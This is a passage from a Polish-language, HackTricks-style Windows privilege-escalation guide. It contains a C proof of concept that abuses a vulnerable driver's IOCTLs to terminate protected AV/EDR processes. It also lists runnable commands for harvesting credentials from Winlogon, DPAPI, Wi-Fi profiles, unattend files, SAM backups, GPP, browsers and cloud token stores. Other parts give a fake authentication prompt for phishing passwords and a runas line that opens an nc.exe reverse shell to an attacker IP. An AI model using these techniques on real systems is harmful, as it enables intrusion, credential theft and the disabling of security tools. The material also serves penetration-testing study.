Jeśli sterownik udostępnia arbitralny prymityw odczytu/zapisu jądra (częste w źle zaprojektowanych handlerach IOCTL), możesz eskalować, kradnąc token SYSTEM bezpośrednio z pamięci jądra. Zobacz technikę krok‑po‑kroku tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

W przypadku błędów warunków wyścigu, gdzie podatne wywołanie otwiera kontrolowaną przez atakującego ścieżkę Object Manager, celowe spowolnienie wyszukiwania (używając komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Nowoczesne luki w hive pozwalają przygotować deterministyczne układy, wykorzystać zapisywalne potomki HKLM/HKU i przekształcić uszkodzenie metadanych w przepełnienia kernel paged-pool bez niestandardowego sterownika. Poznaj pełny łańcuch tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Niektóre podpisane third‑party sterowniki tworzą swój obiekt urządzenia ze silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi secure DACL nie jest egzekwowany, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent, pozwalając dowolnemu nieuprzywilejowanemu użytkownikowi uzyskać uchwyt przy użyciu namespace path takiej jak:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Gdy użytkownik może otworzyć urządzenie, uprzywilejowane IOCTLs udostępnione przez sterownik mogą być wykorzystane do LPE i manipulacji. Przykładowe możliwości zaobserwowane w rzeczywistości:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Środki zaradcze dla deweloperów
- Zawsze ustaw FILE_DEVICE_SECURE_OPEN przy tworzeniu device objects przeznaczonych do ograniczenia przez DACL.
- Waliduj kontekst wywołującego dla operacji uprzywilejowanych. Dodaj sprawdzenia PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytu.
- Ogranicz IOCTLs (access masks, METHOD_*, walidacja wejścia) i rozważ modele brokered zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwarcia w user-mode podejrzanych nazw urządzeń (e.g., \\ .\\amsdk*) oraz specyficzne sekwencje IOCTL wskazujące na nadużycia.
- Wymuszaj Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zabronionych.


## PATH DLL Hijacking

Jeśli masz **uprawnienia zapisu w folderze znajdującym się na PATH** możesz być w stanie przejąć DLL wczytywaną przez proces i **escalate privileges**.

Sprawdź uprawnienia wszystkich folderów znajdujących się w PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Więcej informacji o tym, jak wykorzystać tę kontrolę:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Sprawdź, czy w hosts file są na stałe wpisane inne znane komputery
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otwarte porty

Sprawdź, czy z zewnątrz dostępne są **usługi o ograniczonym dostępie**
```bash
netstat -ano #Opened ports?
```
### Tablica routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reguły Firewalla

[**Sprawdź tę stronę pod kątem poleceń związanych z Firewall**](../basic-cmd-for-pentesters.md#firewall) **(wypisz reguły, utwórz reguły, wyłącz, wyłącz...)**

Więcej [poleceń do enumeracji sieci tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli zdobędziesz uprawnienia root, możesz nasłuchiwać na dowolnym porcie (po raz pierwszy, gdy użyjesz `nc.exe` do nasłuchiwania na porcie, GUI zapyta, czy `nc` powinno być dozwolone przez firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Poświadczenia Windows

### Poświadczenia Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menedżer poświadczeń / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault przechowuje poświadczenia użytkowników dla serwerów, stron internetowych i innych programów, do których **Windows** może **automatycznie logować użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać swoje poświadczenia Facebooka, Twittera, Gmaila itp., aby automatycznie logować się przez przeglądarki. Jednak tak nie jest.

Windows Vault przechowuje poświadczenia, których Windows może użyć do automatycznego logowania użytkowników, co oznacza, że każda **aplikacja Windows, która potrzebuje poświadczeń do dostępu do zasobu** (serwera lub strony internetowej) **może korzystać z tego Credential Manager** & Windows Vault i użyć dostarczonych poświadczeń zamiast tego, żeby użytkownicy za każdym razem wpisywali nazwę użytkownika i hasło.

Jeżeli aplikacje nie współpracują z Credential Manager, nie sądzę, żeby mogły użyć poświadczeń dla danego zasobu. Więc jeśli twoja aplikacja chce korzystać z Windows Vault, powinna w jakiś sposób **komunikować się z Credential Manager i żądać poświadczeń dla tego zasobu** z domyślnego magazynu.

Użyj `cmdkey`, aby wyświetlić zapisane poświadczenia na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny przez udział SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Używanie `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Należy zauważyć, że mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), lub z [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, stosowaną głównie w systemie Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. To szyfrowanie wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy przy użyciu klucza symetrycznego, który jest wyprowadzany z sekretów logowania użytkownika**. W scenariuszach związanych z szyfrowaniem systemowym wykorzystuje sekrety uwierzytelniania domeny systemu.

Szyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` reprezentuje użytkownika [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Klucz DPAPI, współlokalizowany z kluczem głównym, który chroni prywatne klucze użytkownika w tym samym pliku**, zwykle składa się z 64 bajtów losowych danych. (Ważne jest, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wylistowanie jego zawartości za pomocą polecenia `dir` w CMD, chociaż można je wylistować przez PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **mimikatz module** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby je odszyfrować.

Pliki **credentials chronione przez master password** zwykle znajdują się w:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
Możesz użyć **mimikatz module** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).\
Możesz **wyodrębnić wiele DPAPI** **masterkeys** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** are often used for **scripting** and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using **DPAPI**, which typically means they can only be decrypted by the same user on the same computer they were created on.

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Sieć Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Znajdziesz je w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchomione polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń pulpitu zdalnego**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Użyj modułu `dpapi::rdg` w **Mimikatz** z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wyodrębnić wiele DPAPI masterkeys** z pamięci za pomocą modułu `sekurlsa::dpapi` w **Mimikatz**.

### Sticky Notes

Użytkownicy często używają aplikacji StickyNotes na stacjach roboczych Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Ten plik znajduje się pod adresem `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać i przeanalizować.

### AppCmd.exe

**Zwróć uwagę, że aby odzyskać hasła z AppCmd.exe musisz być Administrator i uruchomić proces na poziomie High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe że niektóre **credentials** zostały skonfigurowane i mogą zostać **odzyskane**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH klucze hosta
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys w rejestrze

SSH private keys mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc powinieneś sprawdzić, czy znajduje się tam coś interesującego:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest on przechowywany zaszyfrowany, ale można go łatwo odszyfrować przy użyciu [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie systemu, uruchom:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Wygląda na to, że ta technika nie jest już prawidłowa. Próbowałem stworzyć kilka ssh keys, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie zidentyfikował użycia `dpapi.dll` podczas uwierzytelniania przy użyciu klucza asymetrycznego.

### Pliki pozostawione bez nadzoru
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz także wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Dane uwierzytelniające w chmurze
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Zbuforowane hasło GPP

Funkcja była wcześniej dostępna, która umożliwiała wdrożenie niestandardowych kont administratora lokalnego na grupie maszyn za pomocą Group Policy Preferences (GPP). Jednakże ta metoda miała poważne wady bezpieczeństwa. Po pierwsze, Group Policy Objects (GPOs), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła zawarte w tych GPP, zaszyfrowane AES256 za pomocą jawnie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez dowolnego uwierzytelnionego użytkownika. Stwarzało to poważne ryzyko, ponieważ mogło pozwolić użytkownikom na uzyskanie podwyższonych uprawnień.

Aby zminimalizować to ryzyko, opracowano funkcję skanującą lokalnie zbuforowane pliki GPP zawierające pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, co ułatwia identyfikację i naprawę tej luki bezpieczeństwa.

Przeszukaj `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_ w poszukiwaniu tych plików:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korzystanie z crackmapexec do pobrania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład pliku web.config z poświadczeniami:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN poświadczenia
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o credentials

Zawsze możesz **poprosić użytkownika o podanie jego credentials lub nawet credentials innego użytkownika** jeśli uważasz, że może je znać (zauważ, że **proszenie** klienta bezpośrednio o **credentials** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierających credentials**

Znane pliki, które jakiś czas temu zawierały **passwords** w **clear-text** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Przeszukaj wszystkie proponowane pliki:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Poświadczenia w Koszu

Sprawdź też Kosz w poszukiwaniu poświadczeń.

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające poświadczenia**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Powinieneś sprawdzić bazy danych, w których przechowywane są hasła z **Chrome or Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek — być może niektóre **hasła są** tam przechowywane.

Narzędzia do wydobywania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **intercommunication** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identified via a class ID (CLSID)** i każdy komponent udostępnia funkcjonalność za pośrednictwem jednego lub więcej interfejsów, identyfikowanych przez interface IDs (IIDs).

Klasy i interfejsy COM są zdefiniowane w rejestrze pod kluczami **HKEY\CLASSES\ROOT\CLSID** oraz **HKEY\CLASSES\ROOT\Interface** odpowiednio. Ten rejestr powstaje przez scalenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wewnątrz CLSID-ów w tym rejestrze znajdziesz podrzędny klucz rejestru **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość nazwaną **ThreadingModel**, która może być **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) lub **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

W praktyce, jeśli uda ci się **nadpisać dowolną z DLL** które będą wykonane, możesz **podnieść uprawnienia** jeśli ta DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrzymania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Przeszukaj zawartość plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukaj plik o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
